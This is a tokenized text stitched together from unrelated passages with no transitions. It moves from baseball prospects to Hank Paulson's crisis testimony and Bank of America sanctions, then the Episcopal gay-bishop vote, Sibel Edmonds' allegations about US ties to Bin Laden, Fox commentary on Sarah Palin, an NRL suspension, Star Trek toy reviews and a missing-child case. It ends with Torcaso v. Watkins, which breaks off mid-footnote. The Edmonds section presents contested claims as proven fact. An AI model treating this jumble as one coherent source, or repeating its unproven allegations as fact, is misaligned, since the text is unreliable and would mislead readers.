On July 17th Bianchi went 0 - 4 and his average dipped to 0.302 .
In the 9 games since he has caught fire , again , collecting 22 hits in 44 at bats .
He is now “ blocked ” by Betancourt at the ML level , but he deserves a late season call up .
The fact that he is now blocked is what bothered me most about the trade for Yunie .
Betancourt has been better than TPJ , admittedly a very minor accomplishment , so I ’m rolling with the trade .
That said , I think Bianchi could have provided similar return during the second half of this season without having to trade away two pitching prospects and lock up millions of dollars .
I need to stop myself here , because I do n’t want this to be about questionable trades or decisions by our front office so back on topic we go .
Color me an optimist , which I do n’t really think I am , but I firmly believe that Hosmer and Moustakas will hit well once they reach the majors .
With Parraz , Lough , Bianchi , and others also in the mix as ascending players , the 2 first round picks wo n’t have to carry the load for the Royals on their own .
If only Gordon and Butler were afforded that same luxury when they first reached the big leagues .
Former Treasury Secretary Hank Paulson is attempting to defend the indefensible : himself .
He even claims to have " saved this nation from great peril . "
Please consider his preposterous claims as outlined in Paulson defends his response to economic crisis .
Defending the government 's handling of the economic crisis last year , former Treasury Secretary Henry Paulson said Wednesday that the Bush administration 's responses were not perfect but " saved this nation from great peril . "
" Many more Americans would be without their homes , their jobs , their businesses , their savings and their way of life , " he said in written testimony prepared for a hearing Thursday .
" Our responses were not perfect ...
But , having had the benefit of some time to reflect , and to consider views expressed by others , I am confident that our responses were substantially correct and they saved this nation from great peril , " Paulson wrote .
Paulson also defended himself against allegations that he and Federal Reserve Chairman Ben Bernanke pressured Bank of America Corp. into acquiring Merrill Lynch , despite mounting financial losses at Merrill that were ultimately absorbed by Bank of America stockholders .
Bernanke has denied threatening to oust Bank of America CEO Kenneth Lewis if he abandoned the takeover .
Paulson said he told Lewis that reneging on the promise to purchase Merrill would show " a colossal lack of judgment . "
He then pointed out to Lewis that the Fed could remove management at the bank if it saw fit , he said .
" By referring to the Federal Reserve 's supervisory powers , I intended to deliver a strong message reinforcing the view that had been consistently expressed by the Federal Reserve , as Bank of America 's regulator , and shared by the Treasury , that it would be unthinkable for Bank of America to take this destructive action for which there was no reasonable legal basis and which would show a lack of judgment , " Paulson said .
Paulson Belongs In Prison
Paulson Bent to Demands of Bank CEO
Lawmakers accused former Treasury Secretary Henry Paulson on Thursday of bending to the demands of a major bank and keeping negotiations of a hefty bailout secret in his rush to stabilize financial markets last year .
Paulson , testifying for the first time since leaving office in January after putting in place a $ 700 billion bank bailout program , was defiant in his response and admitted no wrongdoing .
In one particularly testy exchange , Democratic Rep. Marcy Kaptur suggested that Paulson -- the former head of Goldman Sachs -- needed to visit her home state of Ohio to see how bad the economy really is .
" I know how terrible it is , I 'm telling you it would have been worse " had the government not intervened , Paulson said .
Kaptur , who voted against the bailout program , responded : " If that 's your best argument , that 's not good enough . "
Paulson acknowledged in his testimony that he pressured Bank of America CEO Kenneth Lewis to proceed with the deal despite Merrill 's mounting financial losses .
Paulson said he warned Lewis that Lewis might lose his job if he dropped the deal or tried to renegotiate because doing so would exhibit a " colossal lack of judgment . "
At one point during the discussions , Paulson pledged government aid to help Bank of America absorb some of the losses from acquiring Merrill .
Paulson said he declined to put that promise in writing because the details would have been vague and would have had to be disclosed publicly by the Treasury Department .
Rep. Edolphus Towns of New York , the panel 's Democratic chairman , said Paulson was all too willing to promise Lewis money after Lewis threatened to back out on the deal .
" All of this happened against a backdrop of unchecked government power , with no transparency or accountability , " Towns said .
Federal Reserve Chairman Ben Bernanke has denied threatening to oust Lewis and said he never told anyone else to , either .
But another Fed official suggested otherwise in an e-mail obtained by the House panel .
Jeffrey Lacker , president of the Richmond Federal Reserve Bank , said in a December 2008 e-mail that Bernanke had planned to make " even more clear " that if Bank of America backed out on the deal , " management is gone . "
Selective Memory Loss
Rep. Alan Grayson on Hank Paulson
" Hank Paulson never should have had that job in the first place .
He had a $ 700 million conflict of interest and everything that he did while he was Treasury Secretary , every single thing that he did , has one explanation - what 's good for Hank Paulson ? "

Secret Sanctions on Bank of America and Citigroup
Bank of America Corp. is operating under a secret regulatory sanction that requires it to overhaul its board and address perceived problems with risk and liquidity management , according to people familiar with the situation .
Rarely disclosed publicly , the so - called memorandum of understanding gives banks a chance to work out their problems without the glare of outside attention .
Financial institutions that fail to address deficiencies can be slapped with harsher penalties that include a publicly announced cease - and - desist order .
The order was imposed in early May , shortly after shareholders of the Charlotte , N.C. , bank stripped Chief Executive Kenneth Lewis of his duties as chairman .
Bank of America faces a series of deadlines , some at the end of July and others in August , these people said .
The MOU is the most serious procedural action taken against Bank of America by federal regulators since the financial crisis erupted .
Citigroup Inc. has been operating since last year under a similar order with the Office of the Comptroller of the Currency , according to people familiar with the matter .
The company recently has been negotiating with the Federal Deposit Insurance Corp. about entering into a similar agreement with that agency , these people say .
Tensions between Bank of America and government officials have been building for several months , most notably a warning to Mr. Lewis by then - Treasury Secretary Henry Paulson that the bank 's management could be pushed out if it abandoned the deal to acquire securities firm Merrill Lynch & Co. , staggered at the time by massive losses .
In late January , the Federal Reserve and Office of the Comptroller of the Currency downgraded their overall ratings of the bank to " fair " from " satisfactory , " according to people familiar with the matter .
In a letter that was reviewed by The Wall Street Journal , the Fed criticized Bank of America 's management and directors for being " overly optimistic " about risk and capital .
The bank 's capital position " was vulnerable " even before the Merrill deal , the Fed concluded , citing " acquisition activity " that included last year 's takeover of mortgage lender Countrywide Financial Corp .
" Management has taken on significant risk , perhaps more than anticipated at the time the acquisition was proposed , " a Fed official wrote in the letter , which accompanied the ratings downgrade and was sent days after the government agreed to $ 20 billion in aid to keep the Merrill deal on track .
As a result , " more than normal supervisory attention will be required for the foreseeable future . "
The MOU surprised some Bank of America executives who had n't expected federal regulators to issue such a formal rebuke .
The bank responded swiftly , with six directors resigning since May 26 .
The departures include O. Temple Sloan Jr. , Bank of America 's lead independent director , and Jackie Ward , chairman of the board 's asset - quality committee .

“ Episcopalians are no strangers to controversy over the gay issue , ” said Yael T. Abouhalkah in The Kansas City Star .
And the Episcopal Church waded in deeper Tuesday , “ effectively ” voting to allow gay clergy “ full inclusion ” in the church , including as bishops .
The controversial vote , six years after “ my church consecrated V. Gene Robinson as its first openly gay bishop , ” was “ the right call . ”
In “ the real world , gays hold all kinds of jobs ” — why not bishop ?
For one thing , “ lifelong man- plus - woman marriage ” is not an optional tenet of Christianity , said Anglican Bishop Tom Wright in The Times of London .
Thus , the Episcopal Church ’s approval of bishops in same - sex relationships “ marks a clear break with the rest of the Anglican Communion , ” even if it ’s merely “ formalizing the schism they initiated six years ago . ”
Episcopalians have n’t “ broken faith ” with our fellow Anglicans , said Diana Butler Bass in BeliefNet .
With much prayer and discussion , we ’ve embraced our struggle “ to be faithful ” as our society “ widens its understanding of human relationships and marriage ” — and “ adapting to local cultures ” is a very traditional , “ important part of being Anglican . ”
Just ask the now - angry African bishops who asked for polygamy to be sanctioned in 1988 .
Well , two - thirds of the Anglican Communion provinces found the gay - bishop issue a step too far , said Lance Dickie in The Seattle Times .
But what ’s so bad about schism ?
As “ treasured ” as the long affiliation has been , Episcopalians now have to choose between their beliefs and Anglican unity .
We ’re all watching to see if they survive their choice .
As Sibel has previously described , and as she reiterates in this latest interview , this process involved using Turkey ( with assistance from ' actors from Pakistan , and Afghanistan and Saudi Arabia ' ) as a proxy , which in turn used Bin Laden and the Taliban and others as a proxy terrorist army .
Control of Central Asia
The goals of the American ' statesmen ' directing these activities included control of Central Asia 's vast energy supplies and new markets for military products .
The Americans had a problem , though .
They needed to keep their fingerprints off these operations to avoid a ) popular revolt in Central Asia ( Uzbekistan , Azerbaijan , Kazakhstan and Turkmenistan ) , and b ) serious repercussions from China and Russia .
They found an ingenious solution :
Use their puppet - state Turkey as a proxy , and appeal to both pan-Turkic and pan-Islam sensibilities .
Turkey , a NATO ally , has a lot more credibility in the region than the US and , with the history of the Ottoman Empire , could appeal to pan-Turkic dreams of a wider sphere of influence .
The majority of the Central Asian population shares the same heritage , language and religion as the Turks .
In turn , the Turks used the Taliban and al Qaeda , appealing to their dreams of a pan-Islamic caliphate ( Presumably .
Or maybe the Turks / US just paid very well . )
Accordingto Sibel :
This started more than a decade - long illegal , covert operation in Central Asia by a small group in the US intent on furthering the oil industry and the Military Industrial Complex , using Turkish operatives , Saudi partners and Pakistani allies , furthering this objective in the name of Islam .
Uighurs
Sibel was recently askedto write about the recent situation with the Uighurs in Xinjiang , but she declined , apart from saying that " our fingerprint is all over it . "
Of course , Sibel is n't the first or only person to recognize any of this .
Eric Margolis , one of the best reporters in the West on matters of Central Asia , stated that the Uighurs in the training camps in Afghanistan up to 2001 :
" were being trained by Bin Laden to go and fight the communist Chinese in Xinjiang , and this was not only with the knowledge , but with the support of the CIA , because they thought they might use them if war ever broke out with China . "
And also that :
" Afghanistan was not a hotbed of terrorism , these were commando groups , guerrilla groups , being trained for specific purposes in Central Asia . "
In a separate interview , Margolis said :
" That illustrates Henry Kissinger 's bon mot that the only thing more dangerous than being America 's enemy is being an ally , because these people were paid by the CIA , they were armed by the US , these Chinese Muslims from Xinjiang , the most - Western province .
The CIA was going to use them in the event of a war with China , or just to raise hell there , and they were trained and supported out of Afghanistan , some of them with Osama Bin Laden 's collaboration .
The Americans were up to their ears with this . "
Rogues Gallery
Last year , Sibel came up with a brilliant idea to expose some of the criminal activity that she is forbidden to speak about : she publishedeighteen photos , titled " Sibel Edmonds ’ State Secrets Privilege Gallery , " of people involved the operations that she has been trying to expose .
One of those people is Anwar Yusuf Turani , the so - called ' President - in - exile ' of East Turkistan ( Xinjiang ) .
This so - called ' government - in - exile ' was ' established ' on Capitol Hill in September , 2004 , drawing a sharp rebuke from China .
Also featured in Sibel 's Rogues Gallery was ' former ' spook Graham Fuller , who was instrumental in the establishment of Turani's ' government - in - exile ' of East Turkistan .
Fuller has written extensively on Xinjiang , and his " Xinjiang Project " for Rand Corp is apparentlythe blueprint for Turani 's government - in - exile .
Sibel has openly statedher contempt for Mr. Fuller .
Susurluk
The Turkish establishment has a long history of mingling matters of state with terrorism , drug trafficking and other criminal activity , best exemplified by the 1996 Susurluk incident which exposed the so - called Deep State .
Sibel states that " a few main Susurluk actors also ended up in Chicago where they centered ' certain ' aspects of their operations ( Especially East Turkistan - Uighurs ) . "
One of the main Deep State actors , Mehmet Eymur , former Chiefof Counter - Terrorism for Turkey 's intelligence agency , the MIT , features in Sibel 's Rogues Gallery .
Eymur was given exile in the US .
Another member of Sibel 's gallery , Marc Grossman was Ambassador to Turkey at the time that the Susurluk incident exposed the Deep State .
He was recalled shortly after , prior to the end of his assignment , as was Grossman 's underling , Major Douglas Dickerson , who later tried to recruit Sibel into the spying ring .
The modus operandi of the Susurluk gang is the same as the activities that Sibel describes as taking place in Central Asia , the only difference is that this activity was exposed in Turkey a decade ago , whereas the organs of the state in the US , including the corporate media , have successfully suppressed this story .
Chechnya , Albania & Kosovo
Central Asia is not the only place where American foreign policy makers have shared interests with Bin Laden .
Consider the war in Chechnya .
As I documented here , Richard Perle and Stephen Solarz ( both in Sibel 's gallery ) joined other leading neocon luminaries such as Elliott Abrams , Kenneth Adelman , Frank Gaffney , Michael Ledeen , James Woolsey , and Morton Abramowitz in a group called the American Committee for Peace in Chechnya ( ACPC ) .
For his part , Bin Laden donated $ 25 million to the cause , as well as numerous fighters , and technical expertise , establishing training camps .
US interests also convergedwith those of al - Qaeda in Kosovo and Albania .
Of course , it is not uncommon for circumstances to arise where ' the enemy of my enemy is my friend . '
On the other hand , in a transparent democracy , we expect a full accounting of the circumstances leading up to a tragic event like 9/11 .
The 9/11 Commission was supposed to provide exactly that .
State Secrets
Sibel has famously been dubbed the most gagged woman in America , having the State Secrets Privilege imposed on her twice .
Her 3.5 hour testimony to the 9/11 Commission has been entirely suppressed , reduced to a single footnote which refers readers to her classified testimony .
In the interview , she says that the information that was classified in her case specifically identifies that the US was using Bin Laden and the Taliban in Central Asia , including Xinjiang .
In the interview , Sibel reiterates that when invoking the gag orders , the US government claims that it is protecting " ' sensitive diplomatic relations , ' protecting Turkey , protecting Israel , protecting Pakistan , protecting Saudi Arabia ... "
This is no doubt partially true , but it is also true that they are protecting themselves too , and it is a crime in the US to use classification and secrecy to cover up crimes .
As Sibel says in the interview :
I have information about things that our government has lied to us about ... those things can be proven as lies , very easily , based on the information they classified in my case , because we did carry very intimate relationship with these people , and it involves Central Asia , all the way up to September 11 .
Summary
The bombshell here is obviously that certain people in the US were using Bin Laden up to September 11 , 2001 .
It is important to understand why : the US outsourced terror operations to al Qaeda and the Taliban for many years , promoting the Islamization of Central Asia in an attempt to personally profit off military sales as well as oil and gas concessions .
The silence by the US government on these matters is deafening .
So , too , is the blowback .

Fox News , once the Kristol / Krauthammer central of Palin cheerleading , is angry at the self - centered idiocy that has become Sarah Palin ( which makes on think they are all too aware of coming scandals involving Ms. Palin ) :
“ Sarah Palin is inarticulate and under-educated … who really has no credentials for any job . ”
Full Transcript of Liz Trotta ’s piece on Fox News :
Liz Trotta :
It ’s very easy to say that the liberal media is caving in on her , and yes , they are ; but she has given them a lot of raw meat .
The woman is inarticulate , undereducated , and I pose this question : ‘ What do you think William F. Buckley would have thought of her as the standard - bearer for the conservative party ? ’
I think a lot of this criticism is well - deserved .
… This is one of the rare cases where I think all the liberal stylists like Maureen Dowd , Gail Collins , and the rest of them really have a case .
I mean , she just begs for adjectives like flaky and wacky .
… [ Maureen Dowd ’s column ] was a well written , funny piece .
And , you know , there ’s one other element here , and I think most writers are afraid to bring it up .
They sort of skirt the idea that this is a woman who has used her good looks and her gender to really get ahead in the political world .
That ’s something , of course , the men do n’t want to admit , and certainly not the women .
So what are we talking about here ?
We ’re not talking about a great statesman of profound experience whose banner is integrity .
We ’re talking about somebody who , right from the get - go , has been a flashy person who gets into a lot of trouble and really has no credentials for any job .
The Australian National Rugby League plunged to an embarrassing low yesterday with the Sydney Roosters fined $ 64,000 and Queensland Origin star Nate Myles suspended for six games for defecating on the floor of a Central Coast hotel while in a drunken stupor .
The Queensland forward was found shortly after 8 am on Sunday morning , disoriented and naked in a hotel corridor after he had attempted to gain entry into the room of a family who was leaving their accommodation .
Download the new Independent Premium app Sharing the full story , not just the headlines
A short time after his entry was refused he was found to have defecated elsewhere in the hotel corridor and was later discovered in a fire escape .
Furious NRL chief executive David Gallop has blasted the behaviour of Myles , suspending him until round 24 and banning him from playing in Queensland 's Origin III side next Wednesday .
" There can be no ambiguity about the behaviour and there can be no excuse , " Gallop said .
" The facts around the incident are clear and players have to accept personal responsibility .
" I respect the fact that Nate tried to make amends to the guests involved and that he rang me to apologise but saying sorry simply is n't enough .
" There are many inspirational people in our game from the grass roots to the NRL and they do not deserve to be associated with this sort of behaviour .
" We make no apology for treating each issue on its merits and on the basis of the facts we have at our disposal at the time . "
It is yet another body blow in a season to forget for the NRL and is the third alcohol - related incident involving a Roosters player in as many weeks .
Two weeks ago coach Brad Fittler fined himself A$ 10,000 for his own drunken episode at Townsville when he was half - naked and attempted to enter a woman 's room .
Last week hooker Jake Friend and rookie Sandor Earl were charged with assault after a nightclub scuffle -- Friend accused of assaulting a female .
Gallop said if Myles had been on official team duty , instead of at the Central Coast volunteering at a junior rugby league clinic , then the A$ 50,000 fine for the Roosters would have been much more severe .
" Clubs , too , need to accept that they need to take control of the behaviour within their organisation and as much as the Roosters have acted in this matter the issue of three alcohol - related incidents in three weeks , not to mention other offences in the year , is unacceptable , " he said .
" If this had been an official team function the fine would certainly have been higher . "
Roosters chief executive Steve Noyce apologised for the behaviour of the club 's star forward , who only recently signed a contract extension at the club .
" This is an embarrassing position for everyone associated with the Roosters but we have to face up to these issues and we need our senior players to be a part of that process , " said Noyce .
" We work very hard to reward the faith people place in us and for the most part we achieve that goal .
" Moments like this will only make us work even harder . "
The new Star Trek film will be hitting theaters in May , but early signs of merchandising are already appearing .
Playmates has just introduced a line of toys which will be hitting the streets this month .
So far we ’ve only seen a trailer for this film , but these toys give us a first real glimpse into the look - and - feel of the film .
It ’s important to remember that the original Star Trek series was a real breakthrough in terms of production art — a spacecraft no longer had to look like a rocket or a flying saucer , so there ’s a real tradition that ’s at stake here .
That and frankly if Paramount wants to reinvent the franchise they ’ll have to top the amazing work Lucas has been doing these past couple of years with Star Wars .
Our critique starts with the Star Trek Movie Enterprise Vehicle shown above .
The industrial design reminds me a bit too much of the first Star Trek movie from 1979 which was n’t my favorite version of the ship but does show that they ’re staying true to form .
My only complaint warp engines feel a little bit heavy on the front , although it ’s hard to tell if this has been exaggerated for the toy .
So my grade for the new Enterprise is a C +.
Next up we have the Star Trek Movie Enterprise Bridge Playset .
At first look it ’s a bit of an eclectic mix , but I think it sort of works .
There ’s a nice mixture of old and new as the chairs look like something from the original series but the viewing screen seems like something from Star Trek : The Next Generation .
I wish I could get a better look at the captain ’s command chair , but the control panels that I do see bring me back to the old show — so my grade here is A - .
On the Star Trek Movie Electronic
Phaser we ’re at a bit of a disadvantage because we can only see the side view .
My problem with this phaser is that it looks a little bit too retro from the 50s color choices to the Buck Rogers grill .
In fact the design looks like two toys kitbashed together and feels more like something wed see out of a Duck Dodgers cartoon than “ space the final frontier ” .
I ’ll have to see what they use in the film , but frankly this phaser is a failure to me so I ’d give it an F .
I hate the top gap in the flip panel on this Star Trek Movie Electronic Communicator — if the top of the communicator is exposed why even have a flip open mechanism ?
Also the Federation decal looks a bit corny too , but I ’ll give them some benefit of the doubt on this one so I ’ll go with a C +.
This Star Trek Movie Electronic
Tricorder reminds me a little bit too much of the first iMacs from ten years ago !
It lacks a certain amount of detail , but it ’s hard to tell if that ’s just a bad toy design or reflects a lack of attention to detail in the film .
To me it ’s essential that a Tricorder have some sort of small video screen and here we just seem to have a bunch of blinking lights .
It ’s not a total failure , but it ’s not a success either so I ’d go with a C - .
This Star Trek Movie Transporter Room Playset looks like a disaster — if I was a kid I would n’t want this under my Christmas tree !
The bottom of the transporter looks fine , but the top looks goofy .
Now this might be the fault of the toy design and may not reflect of the show , however until I see better I ’m not impressed so the transporter is awarded an F .
No I know you ’re thinking that I ’m being too critical — but it ’s not good enough for these toys to be just good enough .
The franchise is at a weak point and this is the time to win over a new generation of fans .
These toys need to be cooler than any Star Wars toys that you ’d come across and frankly these do n’t do the trick .
Mind you that Playmates is aimed at a younger audience , but that audience is going to even be pickier than old fanboys because the toys have to work as toys first and then compliment the show .
NEW YORK ( CNN ) --
For more than a half - century Jerry and Marilyn Damman wondered what happened to their 2 - year - old boy , who mysteriously vanished into thin air outside a Long Island bakery .
Steven Damman and his sister disappeared from outside a bakery in 1955 .
His sister was found safe .
Now , 54 years later , a Michigan man claims he is the missing child whose name was Steven Damman .
Within the last six months , the unidentified man contacted Nassau County , New York , police and said he had credible evidence that would link him to the case of the missing toddler , according to police Detective Lt. Kevin Smith .
Nassau County police turned the case over to the FBI in Detroit .
So far , authorities will not release the Michigan man 's identity and wo n't say why he believes he is Steven Damman .
The FBI is conducting DNA testing , Smith said .
Sandra Berchtold , spokeswoman for the FBI Detroit bureau , said only , " The FBI investigates all leads in kidnapping cases , but cannot confirm or deny the existence of an investigation in this matter . "
In 1955 , Marilyn Damman took her toddler , Steven , and his baby sister , Pamela , to a bakery in East Meadow .
The mother went inside to do some quick shopping , leaving her 2 - year - old and baby girl in the stroller outside .
But when Damman returned , her children were gone .
A short time later , blocks away , the baby girl was found unharmed and the stroller was intact , but Steven was missing , Smith said .
Thousands of searchers looked for the toddler , but the boy was nowhere to be found .
Hitting one dead end after the next , the Dammans packed up and moved from New York back to Iowa , Jerry Damman said .
And until now , they thought there was little chance of ever seeing their son again .
Jerry Damman , who lives on a farm in Iowa , told CNN , " You never give up hope , [ but ] things dim after all those years . "
He said he is n't ready to comment on the latest developments for various reasons .
Damman says authorities have contacted him , but he has not yet given DNA samples .
A few years back , Steven Damman 's sister gave a DNA sample in connection with the 1957 Philadelphia case of a young boy 's body found in a box .
In that case , all indications were it was not Steven Damman .

U.S. Supreme Court
Torcaso v. Watkins
No. 373
Argued April 24 , 1961
Decided June 19 , 1961
367 U.S. 488
APPEAL FOM THE COURT OF APPEALS OF MARYLAND
Syllabus
Appellant was appointed by the Governor of Maryland to the office of Notary Public , but he was denied a commission because he would not declare his belief in God , as required by the Maryland Constitution .
Claiming that this requirement violated his rights under the First and Fourteenth Amendments , he sued in a state court to compel issuance of his commission , but relief was denied .
The State Court of Appeals affirmed , holding that the state constitutional provision is self - executing , without need for implementing legislation , and requires declaration of a belief in God as a qualification for office .
Held :
This Maryland test for public office cannot be enforced against appellant , because it unconstitutionally invades his freedom of belief and religion guaranteed by the First Amendment and protected by the Fourteenth Amendment from infringement by the States .
Pp. 367 U. S. 489-496 .
223 Md. 49 , 162 A.2d 438 , reversed .
Page 367 U. S. 489
MR. JUSTICE BLACK delivered the opinion of the Court .
Article 37 of the Declaration of Rights of the Maryland Constitution provides :
" [ N ] o religious test ought ever to be required as a qualification for any office of profit or trust in this State , other than a declaration of belief in the existence of God. . . . "
The appellant Torcaso was appointed to the office of Notary Public by the Governor of Maryland , but was refused a commission to serve because he would not declare his belief in God .
He then brought this action in a Maryland Circuit Court to compel issuance of his commission , charging that the State 's requirement that he declare this belief violated " the First and Fourteenth Amendments to the Constitution of the United States .
. . . " [ Footnote 1 ]
The Circuit Court rejected these federal constitutional contentions , and the highest court of the State , the Court of Appeals , affirmed , [ Footnote 2 ] holding that the state constitutional provision is self - executing , and requires declaration of belief in God as a qualification for office without need for implementing legislation .
The case is therefore properly here on appeal under 28 U.S.C. § 1257 ( 2 ) .
There is , and can be , no dispute about the purpose or effect of the Maryland Declaration of Rights requirement before us -- it sets up a religious test which was designed to ,
Page 367 U. S. 490
and , if valid , does , bar every person who refuses to declare a belief in God from holding a public " office of profit or trust " in Maryland .
The power and authority of the State of Maryland thus is put on the side of one particular sort of believers -- those who are willing to say they believe in " the existence of God . "
It is true that there is much historical precedent for such laws .
Indeed , it was largely to escape religious test oaths and declarations that a great many of the early colonists left Europe and came here hoping to worship in their own way .
It soon developed , however , that many of those who had fled to escape religious test oaths turned out to be perfectly willing , when they had the power to do so , to force dissenters from their faith to take test oaths in conformity with that faith .
This brought on a host of laws in the New Colonies imposing burdens and disabilities of various kinds upon varied beliefs depending largely upon what group happened to be politically strong enough to legislate in favor of its own beliefs .
The effect of all this was the formal or practical " establishment " of particular religious faiths in most of the Colonies , with consequent burdens imposed on the free exercise of the faiths of nonfavored believers .
[ Footnote 3 ]
There were , however , wise and farseeing men in the Colonies -- too many to mention -- who spoke out against test oaths and all the philosophy of intolerance behind them .
One of these , it so happens , was George Calvert ( the first Lord Baltimore ) , who took a most important part in the original establishment of the Colony of Maryland .
He was a Catholic and had , for this reason , felt compelled by his conscience to refuse to take the Oath of Supremacy in England at the cost of resigning from high governmental office .
He again refused to take that oath when it was demanded by the Council of the Colony of
Page 367 U. S. 491
Virginia , and , as a result , he was denied settlement in that Colony .
[ Footnote 4 ]
A recent historian of the early period of Maryland 's life has said that it was Calvert 's hope and purpose to establish in Maryland a colonial government free from the religious persecutions he had known -- one " securely beyond the reach of oaths .
. . . " [ Footnote 5 ]
When our Constitution was adopted , the desire to put the people " securely beyond the reach " of religious test oaths brought about the inclusion in Article VI of that document of a provision that " no religious Test shall ever be required as a Qualification to any Office or public Trust under the United States . "
Article VI supports the accuracy of our observation in Girouard v. United States , 328 U. S. 61 , 328 U. S. 69 , that " [t ] he test oath is abhorrent to our tradition . "
Not satisfied , however , with Article VI and other guarantees in the original Constitution , the First Congress proposed and the States very shortly thereafter
Page 367 U. S. 492
adopted our Bill of Rights , including the First Amendment .
[ Footnote 6 ]
That Amendment broke new constitutional ground in the protection it sought to afford to freedom of religion , speech , press , petition and assembly .
Since prior cases in this Court have thoroughly explored and documented the history behind the First Amendment , the reasons for it , and the scope of the religious freedom it protects , we need not cover that ground again .
[ Footnote 7 ]
What was said in our prior cases we think controls our decision here .
In Cantwell v. Connecticut , 310 U. S. 296 , 310 U. S. 303-304 , we said :
" The First Amendment declares that Congress shall make no law respecting an establishment of religion or prohibiting the free exercise thereof .
The Fourteenth Amendment has rendered the legislatures of the states a incompetent as Congress to enact such laws .
. . .
Thus , the Amendment embraces two concepts -- freedom to believe and freedom to act .
The first is absolute but , in the nature of things , the second cannot be . "
Later , we decided Everson v. Board of Education , 330 U. S. 1 , and said this at pages 330 U. S. 15 and 330 U. S. 16 :
" The ' establishment of religion ' clause of the First Amendment means at least this : neither a state nor
Page 367 U. S. 493
the Federal Government can set up a church .
Neither can pass laws which aid one religion , aid all religions , or prefer one religion over another .
Neither can force nor influence a person to go to or to remain away from church against his will or force him to profess a belief or disbelief in any religion .
No person can be punished for entertaining or professing religious beliefs or disbeliefs , for church attendance or nonattendance .
No tax in any amount , large or small , can be levied to support any religious activities or institutions , whatever they may be called , or whatever form they may adopt to teach or practice religion .
Neither a state nor the Federal Government can , openly or secretly , participate in the affairs of any religious organizations or groups , and vice versa .
In the words of Jefferson , the clause against establishment of religion by law was intended to erect ' a wall of separation between church and State . ' "
While there were strong dissents in the Everson case , they did not challenge the Court 's interpretation of the First Amendment 's coverage as being too broad , but thought the Court was applying that interpretation too narrowly to the facts of that case .
Not long afterward , in Illinois ex rel .
McCollum v. Board of Education , 333 U. S. 203 , we were urged to repudiate as dicta the above - quoted Everson interpretation of the scope of the First Amendment 's coverage .
We declined to do this , but instead strongly reaffirmed what had been said in Everson , calling attention to the fact that both the majority and the minority in Everson had agreed on the principles declared in this part of the Everson opinion .
And a concurring opinion in McCollum , written by Mr. Justice Frankfurter and joined by the other Everson dissenters , said this :
" We are all agreed that the First and Fourteenth Amendments have a secular reach far more penetrating
Page 367 U. S. 494
in the conduct of Government than merely to forbid an ' established church . ' . . .
We renew our conviction that "
" we have staked the very existence of our country on the faith that complete separation between the state and religion is best for the state and best for religion .
[ Footnote 8 ] "
The Maryland Court of Appeals thought , and it is argued here , that this Court 's later holding and opinion in Zorach v. Clauson , 343 U. S. 306 , had in part repudiated the statement in the Everson opinion quoted above and previously reaffirmed in McCollum .
But the Court 's opinion in Zorach specifically stated : " We follow the McCollum case . " 343 U.S. at 343 U. S. 315 .
Nothing decided or written in Zorach lends support to the idea that the Court there intended to open up the way for government , state or federal , to restore the historically and constitutionally discredited policy of probing religious beliefs by test oaths or limiting public offices to persons who have , or perhaps more properly profess to have , a belief in some particular kind of religious concept .
[ Footnote 9 ]
Page 367 U. S. 495
We repeat and again reaffirm that neither a State nor the Federal Government can constitutionally force a person " to profess a belief or disbelief in any religion . "
Neither can constitutionally pass laws or impose requirements which aid all religions as against nonbelievers , [ Footnote 10 ] and neither can aid those religions based on a belief in the existence of God as against those religions founded on different beliefs .
[ Footnote 11 ]
In upholding the State 's religious test for public office , the highest court of Maryland said :
" The petitioner is not compelled to believe or disbelieve , under threat of punishment or other compulsion .
True , unless he makes the declaration of belief , he cannot hold public office in Maryland , but he is not compelled to hold office . "
The fact , however , that a person is not compelled to hold public office cannot possibly be an excuse for barring him
Page 367 U. S. 496
from office by state - imposed criteria forbidden by the Constitution .
This was settled by our holding in Wieman v. Updegraff , 344 U. S. 183 .
We there pointed out that , whether or not " an abstract right to public employment exists , " Congress could not pass a law providing " . . . that no federal employee shall attend Mass or take any active part in missionary work . "
[ Footnote 12 ]
This Maryland religious test for public office unconstitutionally invades the appellant 's freedom of belief and religion , and therefore cannot be enforced against him .
The judgment of the Court of Appeals of Maryland is accordingly reversed , and the cause is remanded for further proceedings not inconsistent with this opinion .
Reversed and remanded .
MR. JUSTICE FRANKFURTER and MR .
JUSTICE HARLAN concur in the result .
[ Footnote 1 ]
Appellant also claimed that the State 's test oath requirement violates the provision of Art. VI of the Federal Constitution that " no religious Test shall ever be required as a Qualification to any Office or public Trust under the United States . "
Because we are reversing the judgment on other grounds , we find it unnecessary to consider appellant 's contention that this provision applies to state as well as federal offices .
[ Footnote 2 ]
223 Md. 49 , 162 A.2d 438 .
Appellant 's alternative contention that this test violates the Maryland Constitution also was rejected by the state courts .

[ Footnote 4 ]
The letter from the Virginia Council to the King 's Privy Council is quoted in Hanley , Their Rights and Liberties ( Newman Press 1959 ) , 65 , as follows :
" According to the instructions from your Lordship and the usual course held in this place , we tendered the oaths of supremacy and allegiance to his Lordship [ ; ]
[ Baltimore ] and some of his followers , who making profession of the Romish Religion , utterly refused to take the same .
. . .
His Lordship then offered to take this oath , a copy whereof is included . . . , but we could not imagine that so much latitude was left for us to decline from the prescribed form , so strictly exacted and so well justified and defended by the pen of our late sovereign , Lord King James of happy memory .
. . .
Among the many blessings and favors for which we are bound to bless God . . . there is none whereby it hath been made more happy than in the freedom of our Religion . . . and that no papists have been suffered to settle their abode amongst us .
. . . "
Of course , this was long before Madison 's great Memorial and Remonstrance and the enactment of the famous Virginia Bill for Religious Liberty , discussed in our opinion in Everson v. Board of Education , 330 U. S. 1 , 330 U. S. 11-13 .

" [t ] he result in the McCollum case . . . was based on principles that received unanimous acceptance by this Court , barring only a single vote . "
[ Footnote 9 ]
In one of his famous letters of " a Landholder , " published in December , 1787 , Oliver Ellsworth , a member of the Federal Constitutional Convention and later Chief Justice of this Court , included among his strong arguments against religious test oaths the following statement :
" In short , test laws are utterly ineffectual ; they are no security at all , because men of loose principles will , by an external compliance , evade them .
If they exclude any persons , it will be honest men , men of principle , who will rather suffer an injury than act contrary to the dictates of their consciences .
. . . "
Quoted in Ford , Essays on the Constitution of the United States 170 .
See also 4 Elliott , Debates in the Several State Conventions on the Adoption of the Federal Constitution 193 .
[ Footnote 10 ]
In discussing Article VI in the debate of the North Carolina Convention on the adoption of the Federal Constitution , James Iredell , later a Justice of this Court , said :
" . . . [ i] t is objected that the people of America may , perhaps , choose representatives who have no religion at all , and that pagans and Mahometans may be admitted into offices .
But how is it possible to exclude any set of men without taking away that principle of religious freedom which we ourselves so warmly contend for ? "
And another delegate pointed out that Article VI
